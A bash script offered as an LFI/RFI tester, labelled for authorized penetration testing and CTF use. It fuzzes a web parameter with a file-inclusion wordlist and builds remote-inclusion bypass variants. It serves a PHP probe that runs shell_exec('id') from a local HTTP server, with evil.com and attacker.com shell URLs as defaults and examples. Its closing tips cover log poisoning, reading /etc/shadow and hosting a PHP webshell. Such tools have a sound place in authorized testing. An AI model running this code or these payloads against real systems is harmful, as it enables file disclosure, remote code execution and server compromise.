#!/usr/bin/env bash
# lfi_rfi_tester.sh — Test a URL parameter for LFI and RFI vulnerabilities
#
# !! FOR AUTHORIZED PENETRATION TESTING AND CTF USE ONLY !!
# Do not use against systems you do not own or have explicit written permission to test.
#
# USAGE:
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ"
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ" -t lfi
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ" -t rfi -r http://attacker.com/shell.txt
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php" -p file -t both
#
# LFI WORDLIST — LFI-Jhaddix.txt from danielmiessler/SecLists, resolved in order:
#   1. -w <path>   explicit path you provide
#   2. Common SecLists install paths (Kali, Homebrew, manual clone)
#   3. Cached copy in /tmp from a prior run
#   4. Downloaded at runtime from GitHub raw content
#
# REQUIREMENTS: curl, grep, sed

set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

die()    { echo -e "${RED}[!] $*${RESET}" >&2; exit 1; }
info()   { echo -e "${CYAN}[*] $*${RESET}"; }
good()   { echo -e "${GREEN}[+] $*${RESET}"; }
vuln()   { echo -e "${RED}${BOLD}[VULN] $*${RESET}"; }
warn()   { echo -e "${YELLOW}[-] $*${RESET}"; }
detail() { echo -e "${DIM}    $*${RESET}"; }
sep()    { echo -e "${BOLD}$(printf '─%.0s' {1..65})${RESET}"; }

usage() {
    echo -e "${BOLD}lfi_rfi_tester.sh${RESET} — LFI / RFI vulnerability tester"
    echo -e ""
    echo -e "  ${CYAN}-u <url>${RESET}     Target URL with FUZZ placeholder"
    echo -e "               e.g. "http://target/page.php?file=FUZZ""
    echo -e "  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ in URL)"
    echo -e "  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)"
    echo -e "  ${CYAN}-w <path>${RESET}    LFI wordlist path (default: auto-resolve LFI-Jhaddix.txt)"
    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI payloads (overrides auto probe server)"
    echo -e "  ${CYAN}-L <ip>${RESET}      Your attack box IP for RFI probe server (default: auto-detect tun0)"
    echo -e "  ${CYAN}-P <port>${RESET}     Port for RFI probe server (default: random free port)"
    echo -e "  ${CYAN}-c <cookie>${RESET}  Cookie string e.g. "PHPSESSID=abc123""
    echo -e "  ${CYAN}-H <header>${RESET}  Extra header e.g. "Authorization: Bearer token""
    echo -e "  ${CYAN}-o <file>${RESET}    Save results to file"
    echo -e "  ${CYAN}-d <delay>${RESET}   Delay between requests in seconds (default: 0)"
    echo -e "  ${CYAN}-x${RESET}           Stop after first confirmed vulnerability"
    echo -e "  ${CYAN}-v${RESET}           Verbose: show all tested payloads"
    echo -e "  ${CYAN}-h${RESET}           This help"
    echo -e ""
    echo -e "${BOLD}Wordlist resolution order (LFI):${RESET}"
    echo -e "  1. -w <path> if supplied"
    echo -e "  2. SecLists install: /usr/share/seclists, /opt/SecLists, ~/SecLists, Homebrew"
    echo -e "  3. Cached /tmp/LFI-Jhaddix.txt from a previous run"
    echo -e "  4. Downloaded at runtime from raw.githubusercontent.com"
    echo -e ""
    echo -e "${BOLD}Examples:${RESET}"
    echo -e "  $0 -u "http://10.10.10.5/index.php?page=FUZZ""
    echo -e "  $0 -u "http://10.10.10.5/index.php" -p page -t lfi -o results.txt"
    echo -e "  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -c "session=xyz" -x"
    echo -e "  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -w ~/wordlists/LFI-Jhaddix.txt"
    exit 0
}

# ── Wordlist resolution ───────────────────────────────────────────────────────
JHADDIX_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt"
JHADDIX_CACHE="/tmp/LFI-Jhaddix.txt"

SECLISTS_CANDIDATES=(
    "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "$HOME/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "$HOME/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/usr/local/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/opt/homebrew/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
)

resolve_wordlist() {
    local user_path="$1"

    # 1. Explicit path from -w
    if [[ -n "$user_path" ]]; then
        [[ -f "$user_path" ]] || { echo -e "${RED}[!] Wordlist not found: $user_path${RESET}" >&2; exit 1; }
        echo "$user_path"
        return
    fi

    # 2. Common SecLists install locations
    for candidate in "${SECLISTS_CANDIDATES[@]}"; do
        if [[ -f "$candidate" ]]; then
            echo -e "${GREEN}[+] Found SecLists at: $candidate${RESET}" >&2
            echo "$candidate"
            return
        fi
    done

    # 3. Cached copy from a previous run
    if [[ -f "$JHADDIX_CACHE" ]]; then
        echo -e "${GREEN}[+] Using cached wordlist: $JHADDIX_CACHE${RESET}" >&2
        echo "$JHADDIX_CACHE"
        return
    fi

    # 4. Download from GitHub
    echo -e "${YELLOW}[-] SecLists not found locally — downloading LFI-Jhaddix.txt from GitHub...${RESET}" >&2
    if curl -fsSL --max-time 30 -o "$JHADDIX_CACHE" "$JHADDIX_URL" 2>/dev/null; then
        local count
        count=$(grep -c . "$JHADDIX_CACHE" 2>/dev/null || echo "?")
        echo -e "${GREEN}[+] Downloaded $count lines → cached at $JHADDIX_CACHE${RESET}" >&2
        echo "$JHADDIX_CACHE"
        return
    fi

    echo -e "${RED}[!] Could not download wordlist. Install SecLists or use -w <path>.${RESET}" >&2
    exit 1
}

# Strip comments and blank lines
lfi_payloads() {
    local wordlist="$1"
    grep -v '^\s*#' "$wordlist" | grep -v '^\s*$'
}

# ── RFI payloads ──────────────────────────────────────────────────────────────
# Generates bypass variants of the probe file URL
rfi_payloads() {
    local remote="$1"
    echo "${remote}"                          # plain
    echo "${remote}%00"                       # null byte (PHP < 5.3.4)
    echo "${remote}?"                         # trailing ? defeats suffix filters
    echo "${remote}%3F"                       # URL-encoded ?
    echo "${remote}%23"                       # URL-encoded #
    echo "//${remote#http*://}"               # protocol-relative
    echo "${remote/http:/https:}"             # HTTPS variant
    echo "http:${remote#*:}"                  # double-protocol bypass
    echo "${remote}%00.php"                   # null byte + extension junk
}

# ── RFI probe server ───────────────────────────────────────────────────────────
# Finds a free port, writes probe files, starts a background HTTP server.
# Exports: RFI_PROBE_TOKEN  RFI_PROBE_URL  RFI_SERVER_PID  RFI_SERVE_DIR
setup_rfi_server() {
    local lhost="$1" port="$2"

    # Auto-detect attack box IP (tun0 first for VPN, then eth0)
    if [[ -z "$lhost" ]]; then
        lhost=$(ip addr show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
        [[ -z "$lhost" ]] && lhost=$(ip addr show eth0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
        [[ -z "$lhost" ]] && lhost=$(hostname -I 2>/dev/null | awk '{print $1}')
    fi
    if [[ -z "$lhost" ]]; then
        warn "Could not detect local IP — use -L <ip> to specify it" >&2
        return 1
    fi

    # Find a free port if none specified
    if [[ -z "$port" ]]; then
        port=$(python3 -c "import socket; s=socket.socket(); s.bind(('',0)); print(s.getsockname()[1]); s.close()" 2>/dev/null || echo "8888")
    fi

    # Unique token — server reflects this back if RFI succeeds
    RFI_PROBE_TOKEN="RFIPROBE$(date +%s)$$"
    RFI_SERVE_DIR=$(mktemp -d /tmp/rfi_serve_XXXXXX)

    # probe.txt — plain token, detected if server fetches and includes the file
    echo "${RFI_PROBE_TOKEN}" > "${RFI_SERVE_DIR}/probe.txt"

    # probe.php — token + id output, detected if server also executes PHP
    printf '<?php echo "%s"; echo shell_exec("id"); ?>'         "${RFI_PROBE_TOKEN}" > "${RFI_SERVE_DIR}/probe.php"

    RFI_PROBE_URL="http://${lhost}:${port}"

    # Start Python HTTP server in background
    ( cd "${RFI_SERVE_DIR}" && python3 -m http.server "${port}" >/dev/null 2>&1 ) &
    RFI_SERVER_PID=$!

    sleep 0.8   # give it time to bind

    if ! kill -0 "${RFI_SERVER_PID}" 2>/dev/null; then
        warn "HTTP server failed to start on port ${port} — try a different port with -P" >&2
        return 1
    fi

    echo -e "${GREEN}[+] Probe server  : ${RFI_PROBE_URL} (PID ${RFI_SERVER_PID})${RESET}" >&2
    echo -e "${GREEN}[+] Probe token   : ${RFI_PROBE_TOKEN}${RESET}" >&2
    echo -e "${GREEN}[+] Probe files   : probe.txt (plain)  probe.php (token+id exec)${RESET}" >&2
    echo -e "${CYAN}[*] Serving from  : ${RFI_SERVE_DIR}${RESET}" >&2
    return 0
}

teardown_rfi_server() {
    if [[ -n "${RFI_SERVER_PID:-}" ]]; then
        kill "${RFI_SERVER_PID}" 2>/dev/null
        good "RFI probe server stopped (PID ${RFI_SERVER_PID})" >&2
    fi
    [[ -n "${RFI_SERVE_DIR:-}" ]] && rm -rf "${RFI_SERVE_DIR}"
}


# ── Detection: LFI ───────────────────────────────────────────────────────────
detect_lfi() {
    local body="$1"

    if echo "$body" | grep -qE 'root:[x*!]:0:0'; then
        echo "root passwd entry found"
        return 0
    fi
    if echo "$body" | grep -qiE '\[fonts\]|\[extensions\]|\[boot loader\]|127\.0\.0\.1\s+localhost'; then
        echo "Windows config/hosts file content found"
        return 0
    fi
    if echo "$body" | grep -qE '^[A-Za-z0-9+/]{40,}={0,2}$'; then
        echo "Possible base64-encoded PHP source (php://filter hit)"
        return 0
    fi
    if echo "$body" | grep -qE 'PATH=|HTTP_USER_AGENT=|DOCUMENT_ROOT='; then
        echo "Environment variables leaked (/proc/self/environ)"
        return 0
    fi
    if echo "$body" | grep -qiE 'ubuntu|debian|centos|fedora|alpine linux'; then
        echo "OS release string found"
        return 0
    fi
    if echo "$body" | grep -qE '"GET |"POST |HTTP/1\.[01]'; then
        echo "Web server log content found (log poisoning possible)"
        return 0
    fi

    return 1
}

# ── Detection: RFI ───────────────────────────────────────────────────────────
# $1 = response body  $2 = unique probe token we wrote into the served file
detect_rfi() {
    local body="$1" probe="$2"

    # Primary: probe token reflected — server fetched and included our file
    if echo "$body" | grep -qF "$probe"; then
        echo "Probe token reflected — server fetched and included remote file"
        return 0
    fi

    # Secondary: RCE output patterns — server executed our PHP payload
    if echo "$body" | grep -qiP 'uid=\d+\(\w+\)\s+gid=\d+'; then
        echo "RCE confirmed — id command output detected"
        return 0
    fi

    # Tertiary: error messages that reveal the server tried to fetch the URL
    # (connection refused, failed to open stream, etc.)
    if echo "$body" | grep -qiE         'failed to open stream|allow_url_include|Connection refused|No such file|Warning.*include|Warning.*require'; then
        echo "Server attempted remote fetch (error message leaked)"
        return 0
    fi

    return 1
}

# ── HTTP request ──────────────────────────────────────────────────────────────
send_request() {
    local url="$1" cookie="$2" extra_header="$3"
    local args=(-s -L --max-time 10 --max-redirs 3 -A "Mozilla/5.0")

    [[ -n "$cookie" ]]       && args+=(-b "$cookie")
    [[ -n "$extra_header" ]] && args+=(-H "$extra_header")

    curl "${args[@]}" "$url" 2>/dev/null || true
}

# ── URL builder ───────────────────────────────────────────────────────────────
build_url() {
    local base="$1" param="$2" payload="$3"

    if echo "$base" | grep -q 'FUZZ'; then
        echo "${base/FUZZ/$payload}"
    elif [[ -n "$param" ]]; then
        if echo "$base" | grep -qE "[?&]${param}="; then
            echo "$base" | sed "s/\(${param}=\)[^&]*/\1${payload}/"
        elif echo "$base" | grep -q '?'; then
            echo "${base}&${param}=${payload}"
        else
            echo "${base}?${param}=${payload}"
        fi
    else
        die "No FUZZ placeholder in URL and no -p parameter specified."
    fi
}

# ── Main ──────────────────────────────────────────────────────────────────────
main() {
    local url="" param="" test_type="both" wordlist_path=""
    local remote_url="http://evil.com/rfi_test.txt"
    local lhost="" lport=""
    local cookie="" extra_header="" outfile=""
    local delay=0 stop_first=0 verbose=0

    [[ $# -eq 0 ]] && usage

    while getopts "u:p:t:w:r:c:H:L:P:o:d:xvh" opt; do
        case "$opt" in
            u) url="$OPTARG" ;;
            p) param="$OPTARG" ;;
            t) test_type="$OPTARG" ;;
            w) wordlist_path="$OPTARG" ;;
            r) remote_url="$OPTARG" ;;
            L) lhost="$OPTARG" ;;
            P) lport="$OPTARG" ;;
            c) cookie="$OPTARG" ;;
            H) extra_header="$OPTARG" ;;
            o) outfile="$OPTARG" ;;
            d) delay="$OPTARG" ;;
            x) stop_first=1 ;;
            v) verbose=1 ;;
            h) usage ;;
            *) usage ;;
        esac
    done

    command -v curl &>/dev/null || die "curl is required"
    [[ -z "$url" ]] && die "Target URL is required (-u)"
    [[ "$test_type" =~ ^(lfi|rfi|both)$ ]] || die "Invalid type: $test_type (lfi|rfi|both)"

    # ── Resolve LFI wordlist ──────────────────────────────────────────────────
    local resolved_wordlist=""
    if [[ "$test_type" == "lfi" || "$test_type" == "both" ]]; then
        resolved_wordlist=$(resolve_wordlist "$wordlist_path")
        local payload_count
        payload_count=$(lfi_payloads "$resolved_wordlist" | grep -c . || echo "?")
        info "Wordlist : $resolved_wordlist"
        info "Payloads : $payload_count"
    fi

    # ── Baseline ──────────────────────────────────────────────────────────────
    info "Getting baseline response..."
    local baseline_url
    baseline_url=$(build_url "$url" "$param" "BASELINE_NONEXISTENT_12345")
    local baseline
    baseline=$(send_request "$baseline_url" "$cookie" "$extra_header")
    local baseline_len=${#baseline}
    info "Baseline : $baseline_len bytes"

    if [[ -n "$outfile" ]]; then
        echo "lfi_rfi_tester results — $(date)" > "$outfile"
        echo "Target: $url" >> "$outfile"
        echo "Wordlist: ${resolved_wordlist:-n/a}" >> "$outfile"
        echo "---" >> "$outfile"
    fi

    local vuln_count=0 tested=0

    # ── LFI Testing ───────────────────────────────────────────────────────────
    if [[ "$test_type" == "lfi" || "$test_type" == "both" ]]; then
        sep
        info "Starting LFI tests (LFI-Jhaddix.txt)..."
        sep

        while IFS= read -r payload; do
            [[ -z "$payload" || "$payload" == \#* ]] && continue

            local target_url
            target_url=$(build_url "$url" "$param" "$payload")
            local response
            response=$(send_request "$target_url" "$cookie" "$extra_header")
            local resp_len=${#response}
            ((tested++))

            local match=""
            if match=$(detect_lfi "$response"); then
                vuln "[LFI CONFIRMED] $payload"
                detail "URL:    $target_url"
                detail "Reason: $match"
                detail "Length: $resp_len bytes"
                echo
                [[ -n "$outfile" ]] && echo "[LFI] $target_url | $match" >> "$outfile"
                ((vuln_count++))
                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
            else
                local diff=$(( resp_len - baseline_len ))
                if [[ ${diff#-} -gt 200 ]]; then
                    warn "Anomalous response: $payload  (delta: ${diff} bytes)"
                    [[ "$verbose" -eq 1 ]] && detail "URL: $target_url"
                else
                    [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
                fi
            fi

            [[ "$delay" != "0" ]] && sleep "$delay"
        done < <(lfi_payloads "$resolved_wordlist")
    fi

    # ── RFI Testing ───────────────────────────────────────────────────────────
    if [[ "$test_type" == "rfi" || "$test_type" == "both" ]]; then
        sep
        info "Starting RFI tests..."
        sep

        # Globals set by setup_rfi_server
        RFI_PROBE_TOKEN=""; RFI_PROBE_URL=""
        RFI_SERVER_PID="";  RFI_SERVE_DIR=""

        if setup_rfi_server "$lhost" "$lport"; then
            # Ensure server is killed on exit/interrupt
            trap 'teardown_rfi_server' EXIT INT TERM

            warn "RFI requires allow_url_include=On (and allow_url_fopen=On) in PHP"
            echo ""

            # Test probe.txt first (plain inclusion), then probe.php (inclusion + RCE)
            for probe_file in probe.txt probe.php; do
                local probe_url="${RFI_PROBE_URL}/${probe_file}"
                info "Testing probe: $probe_url"
                local found_for_file=0

                while IFS= read -r payload; do
                    [[ -z "$payload" || "$payload" == \#* ]] && continue

                    local target_url
                    target_url=$(build_url "$url" "$param" "$payload")
                    local response
                    response=$(send_request "$target_url" "$cookie" "$extra_header")
                    ((tested++))

                    local match=""
                    if match=$(detect_rfi "$response" "$RFI_PROBE_TOKEN"); then
                        vuln "[RFI CONFIRMED] $payload"
                        detail "Probe   : $probe_file"
                        detail "URL     : $target_url"
                        detail "Reason  : $match"
                        if [[ "$probe_file" == "probe.php" ]]; then
                            detail "PHP exec: server ran shell_exec('id') — full RCE likely"
                        fi
                        echo
                        [[ -n "$outfile" ]] && echo "[RFI] $target_url | $probe_file | $match" >> "$outfile"
                        ((vuln_count++))
                        found_for_file=1
                        if [[ "$stop_first" -eq 1 ]]; then
                            good "Stopping on first hit (-x)."
                            teardown_rfi_server
                            break 2
                        fi
                        # Working payload found for this probe file — move to next
                        break
                    else
                        [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
                    fi

                    [[ "$delay" != "0" ]] && sleep "$delay"
                done < <(rfi_payloads "$probe_url")
            done

            teardown_rfi_server

        else
            warn "Could not start RFI probe server — skipping RFI tests"
            warn "Ensure python3 is available, or specify IP/port with -L <ip> -P <port>"
        fi
    fi

    # ── Summary ───────────────────────────────────────────────────────────────
    sep
    echo -e "${BOLD}Results: $vuln_count confirmed from $tested requests.${RESET}"
    [[ -n "$outfile" ]] && good "Output saved to: $outfile"

    if [[ "$vuln_count" -gt 0 ]]; then
        echo
        warn "LFI next steps:"
        warn "  • php://filter to read source of other PHP files"
        warn "  • Log poisoning: inject PHP via User-Agent, then include log"
        warn "  • /proc/self/environ if User-Agent reaches environment"
        warn "  • Check readability of /etc/shadow"
        warn "RFI next steps:"
        warn "  • Host a PHP webshell and include via vulnerable param"
        warn "  • Requires allow_url_include=On and allow_url_fopen=On"
    fi
}

main "$@"
